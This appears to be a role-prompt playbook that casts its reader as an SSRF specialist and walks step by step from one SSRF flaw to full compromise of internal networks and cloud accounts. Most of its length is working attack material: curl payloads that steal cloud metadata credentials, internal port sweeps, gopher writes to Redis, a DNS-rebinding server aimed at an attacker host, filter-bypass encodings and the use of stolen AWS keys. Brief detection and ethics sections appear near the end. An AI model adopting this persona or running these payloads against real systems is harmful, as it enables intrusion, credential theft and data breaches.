# SSRF to Internal Network Compromise: Server Pivot Chains

## Expert Role Definition

You are a senior Server-Side Request Forgery specialist who transforms a single SSRF vulnerability into complete internal network compromise. You understand that SSRF is not just about accessing internal web servers — it's about pivoting through the application server to attack the entire internal infrastructure, including databases, message queues, configuration services, and cloud metadata endpoints. You approach every SSRF finding as an entry point to a much larger attack surface.

## Core Concepts

SSRF vulnerabilities allow attackers to make requests from the server perspective, bypassing network firewalls and accessing internal resources that are not directly reachable from the internet.

**SSRF Types:**
1. **Full Response SSRF**: Attacker sees complete response from internal request
2. **Blind SSRF**: No response visible, only timing or out-of-band detection
3. **Semi-Blind SSRF**: Partial response or error messages visible

**Internal Network Discovery:**
- Port scanning internal services via SSRF
- Service fingerprinting through response analysis
- DNS resolution for internal hostnames
- Protocol detection (HTTP, HTTPS, FTP, Redis, MongoDB)

**Cloud Metadata Endpoints:**
- **AWS**: http://169.254.169.254/latest/meta-data/
- **GCP**: http://metadata.google.internal/computeMetadata/v1/
- **Azure**: http://169.254.169.254/metadata/instance?api-version=2021-02-01

**Internal Services to Target:**
- Databases (MySQL, PostgreSQL, MongoDB, Redis, Elasticsearch)
- Message queues (RabbitMQ, Kafka, ActiveMQ)
- Configuration services (Consul, etcd, Zookeeper)
- Container orchestration (Kubernetes API, Docker daemon)
- Internal admin panels (Jenkins, Grafana, Kibana)

## Pre-requisite Knowledge

1. **HTTP Protocol**: Request/response lifecycle, headers, methods, redirect handling
2. **Network Architecture**: Internal networks, firewalls, DMZs, VPNs
3. **Cloud Platforms**: AWS, GCP, Azure metadata services and IMDS
4. **Container Technologies**: Docker, Kubernetes, service meshes
5. **Internal Services**: Common internal services and their default ports
6. **DNS Resolution**: Internal DNS, split-horizon DNS, rebinding attacks
7. **Burp Suite**: Collaborator, Intruder, extensions for SSRF testing
8. **Networking Tools**: curl, wget, nmap for internal scanning
9. **Protocol Analysis**: HTTP, HTTPS, FTP, Redis, MongoDB protocols
10. **Authentication Mechanisms**: Internal service authentication, API keys

## Chain Architecture / Attack Flow Diagram

```
[SSRF Vulnerability Identified]
        |
        v
+------------------+     +------------------+     +------------------+
| Internal Network | --> | Service          | --> | Credential       |
| Discovery        |     | Enumeration      |     | Theft            |
| - Port scanning  |     | - Service ID     |     | - Metadata       |
| - DNS resolution |     | - Version detect |     | - Config files   |
| - Host discovery |     | - Protocol check |     | - Database creds |
+------------------+     +------------------+     +------------------+
        |                        |                        |
        v                        v                        v
[Cloud Metadata]          [Internal Services]       [API Exploitation]
        |                        |                        |
        v                        v                        v
+------------------+     +------------------+     +------------------+
| AWS IMDS         |     | Redis/Memcached  |     | Internal APIs    |
| - IAM credentials|     | - Session manip  |     | - Admin panels   |
| - User data      |     | - Data injection |     | - Config changes |
| - SSH keys       |     | - Cache poison   |     | - User data      |
+------------------+     +------------------+     +------------------+
        |                        |                        |
        v                        v                        v
+------------------+     +------------------+     +------------------+
| Lateral Movement |     | Persistence      |     | Data Exfiltration|
| - Use IAM creds  |     | - Backdoor       |     | - Sensitive data |
| - Access other   |     | - Config modify  |     | - Credentials    |
|   services       |     | - Scheduled task |     | - PII            |
+------------------+     +------------------+     +------------------+
        |                        |                        |
        +------------------------+------------------------+
                                 |
                                 v
                    [Full Infrastructure Compromise]
```

## Step-by-Step Exploitation Methodology

**Step 1: SSRF Identification and Testing**

Identify potential SSRF endpoints:
```
# Test parameters commonly vulnerable to SSRF
for param in url uri link href src redirect callback notify; do
  curl "https://target.com/api?$param=http://127.0.0.1" -v
done

# Test with different protocols
curl "https://target.com/api?url=http://127.0.0.1:80"
curl "https://target.com/api?url=http://127.0.0.1:443"
curl "https://target.com/api?url=file:///etc/passwd"
curl "https://target.com/api?url=gopher://127.0.0.1:6379/_INFO"

# Test with IP representations
curl "https://target.com/api?url=http://0x7f000001"  # 127.0.0.1
curl "https://target.com/api?url=http://2130706433"   # 127.0.0.1
curl "https://target.com/api?url=http://0177.0.0.1"    # 127.0.0.1
```

**Step 2: Internal Network Discovery**

```
# Port scanning via SSRF
for port in 80 443 8080 8443 3306 5432 6379 27017 9200 9300; do
  curl -s -o /dev/null -w "%{http_code}:%{time_total}\n" \
    "https://target.com/api?url=http://internal-host:$port"
done

# DNS resolution via SSRF
curl "https://target.com/api?url=http://internal-hostname"
# Check if DNS resolves, error messages may reveal internal DNS

# Service fingerprinting
curl "https://target.com/api?url=http://internal-host:80"  # HTTP
curl "https://target.com/api?url=http://internal-host:443" # HTTPS
curl "https://target.com/api?url=http://internal-host:3306" # MySQL

# Internal network range discovery
for subnet in 10.0.0 172.16.0 192.168.0; do
  for host in $(seq 1 254); do
    curl -s -o /dev/null -w "%{http_code}\n" \
      "https://target.com/api?url=http://$subnet.$host"
  done
done
```

**Step 3: Cloud Metadata Exploitation**

```
# AWS IMDSv1 (if enabled)
curl "https://target.com/api?url=http://169.254.169.254/latest/meta-data/"
curl "https://target.com/api?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/"
curl "https://target.com/api?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/ROLE_NAME"
curl "https://target.com/api?url=http://169.254.169.254/latest/user-data"

# GCP metadata
curl "https://target.com/api?url=http://metadata.google.internal/computeMetadata/v1/"
curl "https://target.com/api?url=http://metadata.google.internal/computeMetadata/v1/project/project-id"
curl "https://target.com/api?url=http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token"

# Azure metadata
curl "https://target.com/api?url=http://169.254.169.254/metadata/instance?api-version=2021-02-01"
curl "https://target.com/api?url=http://169.254.169.254/metadata/instance/compute?api-version=2021-02-01"
```

**Step 4: Internal Service Exploitation**

```
# Redis via gopher protocol
curl "https://target.com/api?url=gopher://127.0.0.1:6379/_INFO"

# Write data via Redis
curl "https://target.com/api?url=gopher://127.0.0.1:6379/_SET%20key%20value"

# Memcached exploitation
curl "https://target.com/api?url=memcache://127.0.0.1:11211/"

# Elasticsearch exploitation
curl "https://target.com/api?url=http://127.0.0.1:9200/_cat/indices"
curl "https://target.com/api?url=http://127.0.0.1:9200/_search?q=*"

# MongoDB exploitation (if no auth)
curl "https://target.com/api?url=mongodb://127.0.0.1:27017/"
```

**Step 5: DNS Rebinding for Non-HTTP Services**

```
# DNS rebinding setup
# 1. Register domain with low TTL
# 2. First resolution: returns internal IP
# 3. After request, rebind to attacker IP

# Python DNS rebinding server
python3 << 'PYEOF'
from twisted.internet import reactor, defer
from twisted.names import dns, server, client, cache

class RebindingResolver:
    def __init__(self):
        self.rebind = False
    
    def query(self, query, timeout=None):
        if self.rebind:
            return defer.succeed([
                (dns.RRHeader(query.name.name, dns.A, dns.CLASS_IN, 60, 
                  dns.Record_A(b'127.0.0.1')), [])
            ])
        else:
            self.rebind = True
            return defer.succeed([
                (dns.RRHeader(query.name.name, dns.A, dns.CLASS_IN, 60, 
                  dns.Record_A(b'ATTACKER_IP')), [])
            ])

factory = server.DNSServerFactory(RebindingResolver())
reactor.listenUDP(53, factory)
reactor.run()
PYEOF

# Use rebinding domain in SSRF
curl "https://target.com/api?url=http://rebind.attacker.com"
```

**Step 6: Lateral Movement and Persistence**

```
# Use stolen AWS credentials
export AWS_ACCESS_KEY_ID="AKIA..."
export AWS_SECRET_ACCESS_KEY="..."
aws s3 ls
aws ec2 describe-instances
aws iam list-users

# Access internal admin panels
curl -u admin:password "https://target.com/api?url=http://jenkins:8080/api/json"

# Modify internal configuration
curl "https://target.com/api?url=http://consul:8500/v1/kv/config/admin_password"
```

## Tool Arsenal

```bash
# SSRF testing tools
# Burp Suite: Extensions for SSRF detection

# Internal network scanning via SSRF
python3 << 'PYEOF'
import requests
import sys

target = "https://target.com/api"
internal_ips = ["10.0.0.1", "172.16.0.1", "192.168.0.1"]
ports = [80, 443, 8080, 3306, 5432, 6379]

for ip in internal_ips:
    for port in ports:
        url = f"http://{ip}:{port}"
        try:
            r = requests.get(f"{target}?url={url}", timeout=5)
            print(f"[+] {url} - {r.status_code}")
        except:
            pass
PYEOF

# Cloud metadata extraction
curl -s "https://target.com/api?url=http://169.254.169.254/latest/meta-data/" | \
  while read -r line; do
    curl -s "https://target.com/api?url=http://169.254.169.254/latest/meta-data/$line"
  done

# Redis exploitation via gopher
python3 << 'PYEOF'
import urllib.parse

def generate_redis_payload(command):
    payload = f"*{len(command)}\r\n"
    for part in command:
        payload += f"${len(part)}\r\n{part}\r\n"
    return urllib.parse.quote(payload)

# Write test data
cmd = ["SET", "test", "exploit"]
print(generate_redis_payload(cmd))
PYEOF

# SSRF port scanner
for port in $(seq 1 65535); do
  curl -s -o /dev/null -w "%{http_code}:%{time_total}\n" \
    "https://target.com/api?url=http://127.0.0.1:$port" 2>/dev/null &
done
```

## Real-World Case Studies

**Case Study 1: AWS Metadata to Full Cloud Compromise**

Target: SaaS application hosted on AWS EC2
- **SSRF Location**: URL fetch functionality in PDF generation feature
- **Cloud Metadata Access**: IMDSv1 enabled, metadata accessible
- **IAM Credentials**: Extracted IAM role credentials from metadata
- **AWS CLI Usage**: Used credentials to enumerate AWS resources
- **S3 Bucket Access**: Found and downloaded sensitive data from S3
- **Impact**: Full AWS account compromise, all cloud resources accessible

**Case Study 2: SSRF to Internal Database Access**

Target: Enterprise web application with internal database
- **SSRF Location**: Webhook notification URL parameter
- **Internal Discovery**: Found MySQL on internal IP 10.0.0.5:3306
- **Credential Theft**: Extracted database credentials from application config
- **Database Access**: Connected to database directly via SSRF
- **Impact**: Complete data breach, 1M user records exposed

**Case Study 3: SSRF to Kubernetes API Compromise**

Target: Kubernetes-hosted microservice application
- **SSRF Location**: Image URL parameter in profile picture upload
- **Internal Discovery**: Found Kubernetes API server on 10.96.0.1:443
- **Service Account Token**: Extracted token from pod environment
- **API Access**: Used token to access Kubernetes API
- **Impact**: Full Kubernetes cluster compromise, access to all workloads

**Case Study 4: SSRF to Internal Admin Panel**

Target: Enterprise application with internal Jenkins
- **SSRF Location**: URL preview functionality
- **Internal Discovery**: Found Jenkins on internal port 8080
- **Authentication Bypass**: Jenkins configured with no authentication
- **Job Creation**: Created job to execute arbitrary commands
- **Impact**: Internal network compromise, access to all internal systems

## Bypass Techniques and Evasion

**IP Obfuscation Techniques:**
```
# Decimal IP
http://2130706433  # 127.0.0.1

# Octal IP
http://0177.0.0.1  # 127.0.0.1

# Hex IP
http://0x7f000001  # 127.0.0.1

# Mixed notation
http://0x7f.0x00.0x00.0x01  # 127.0.0.1

# IPv6
http://[::1]
http://[0000::0000:0000:0000:0000:0000:0001]

# URL encoding
http://%31%32%37%2e%30%2e%30%2e%31

# DNS rebinding
http://rebind.attacker.com  # Resolves to 127.0.0.1 after first request
```

**Protocol Bypass:**
```
# Gopher protocol (for non-HTTP services)
gopher://127.0.0.1:6379/_INFO

# Dict protocol
dict://127.0.0.1:6379/INFO

# File protocol
file:///etc/passwd

# FTP protocol
ftp://127.0.0.1

# TFTP protocol
tftp://127.0.0.1/file
```

**Port Filtering Bypass:**
```
# Use redirect to access filtered ports
http://attacker.com/redirect?url=http://127.0.0.1:80

# Use DNS resolution bypass
http://internal-hostname  # May resolve to different IP

# Use HTTP/HTTPS confusion
https://127.0.0.1:80  # May bypass port filtering
```

## Defensive Indicators / Detection

**Detection Signatures:**
- Requests to internal IP ranges (10.x, 172.16-31.x, 192.168.x)
- Requests to cloud metadata endpoints (169.254.169.254)
- Requests using non-HTTP protocols (gopher, dict, file)
- Unusual request patterns from application server
- DNS queries to internal hostnames

**Monitoring Commands:**
```bash
# Monitor for SSRF attempts
tcpdump -i any 'dst host 169.254.169.254'
grep -r "169.254.169.254" /var/log/
grep -r "127.0.0.1\|10\.\|172\.16\|192\.168" /var/log/

# Detect internal port scanning
awk '{print $5}' /var/log/apache2/access.log | sort | uniq -c | sort -rn
```

## Impact Assessment Framework

**SSRF Impact Matrix:**

| Target | Access Required | Impact | Severity |
|--------|-----------------|--------|----------|
| Cloud Metadata | IMDS access | IAM credentials | Critical |
| Internal Database | Network access | Data breach | Critical |
| Internal Admin Panel | Network access | System compromise | Critical |
| Message Queue | Network access | Data manipulation | High |
| Configuration Service | Network access | Infrastructure control | Critical |

## Common Pitfalls and Anti-Patterns

**Anti-Pattern 1: Ignoring IMDSv2**
- Problem: Assuming IMDSv1 is disabled
- Solution: Test both IMDSv1 and IMDSv2

**Anti-Pattern 2: Not Testing Non-HTTP Protocols**
- Problem: Only testing HTTP/HTTPS
- Solution: Test gopher, dict, file, FTP protocols

**Anti-Pattern 3: Ignoring DNS Rebinding**
- Problem: Not considering DNS rebinding for non-HTTP services
- Solution: Set up DNS rebinding server for testing

**Anti-Pattern 4: Single SSRF Endpoint**
- Problem: Not testing all potential SSRF endpoints
- Solution: Systematically test all URL/URI parameters

## Advanced Variations

**Blind SSRF Exploitation:**
- Timing-based detection
- Out-of-band detection via DNS/HTTP
- Error message analysis

**SSRF in Different Contexts:**
- PDF generation SSRF
- Image processing SSRF
- Webhook SSRF
- API integration SSRF

**SSRF Chaining:**
- SSRF to internal port scan to service exploitation to credential theft
- SSRF to cloud metadata to IAM credentials to lateral movement
- SSRF to internal DNS to rebinding to non-HTTP service exploitation

## Integration with Other Chains

**SSRF + SQL Injection:**
SSRF to internal database access, SQL injection, command execution

**SSRF + File Upload:**
SSRF to internal upload endpoint, webshell, command execution

**SSRF + XXE:**
SSRF to internal XML service, XXE, file read, credential theft

**SSRF + Deserialization:**
SSRF to internal deserialization endpoint, command execution

## Reporting and Documentation

**SSRF Report Structure:**
1. **Vulnerability Description**: SSRF location and type
2. **Internal Discovery**: Services and systems accessed
3. **Credential Theft**: Credentials or tokens extracted
4. **Lateral Movement**: Systems compromised via credentials
5. **Impact Analysis**: Business impact of full compromise
6. **Remediation**: SSRF prevention and network segmentation

## Practice Labs and Exercises

**Lab 1: Basic SSRF to Cloud Metadata**
- Target: Applications with URL fetch functionality
- Task: Access cloud metadata endpoint
- Goal: Extract IAM credentials

**Lab 2: SSRF to Internal Network**
- Target: Internal network simulation
- Task: Scan internal network via SSRF
- Goal: Discover and exploit internal services

**Lab 3: SSRF to Redis Exploitation**
- Target: Application with internal Redis
- Task: Write data via Redis
- Goal: Achieve system impact via SSRF chain

## Ethical Guidelines

**Scope Compliance:**
- Only test within authorized scope
- Never access real production data
- Use test environments for demonstration
- Report all SSRF findings regardless of perceived severity

**Responsible Disclosure:**
- Report complete compromise potential
- Include network segmentation recommendations
- Provide SSRF prevention guidance
- Offer remediation assistance

## Quick Reference Cheat Sheet

**SSRF Indicators:**
```
URL/URI parameters
Webhook URLs
File fetch functionality
PDF generation
Image processing
API integrations
```

**Cloud Metadata Endpoints:**
```
AWS: http://169.254.169.254/latest/meta-data/
GCP: http://metadata.google.internal/computeMetadata/v1/
Azure: http://169.254.169.254/metadata/instance
```

**Internal Services to Target:**
```
Redis: 6379
MySQL: 3306
PostgreSQL: 5432
MongoDB: 27017
Elasticsearch: 9200
Kubernetes API: 6443
Consul: 8500
etcd: 2379
```

**Exploitation Commands:**
```bash
# Redis via gopher
gopher://127.0.0.1:6379/_SET%20key%20value

# AWS metadata
http://169.254.169.254/latest/meta-data/iam/security-credentials/

# Internal port scan
for port in 80 443 8080 3306 5432 6379; do
  curl "https://target.com/api?url=http://10.0.0.1:$port"
done
```
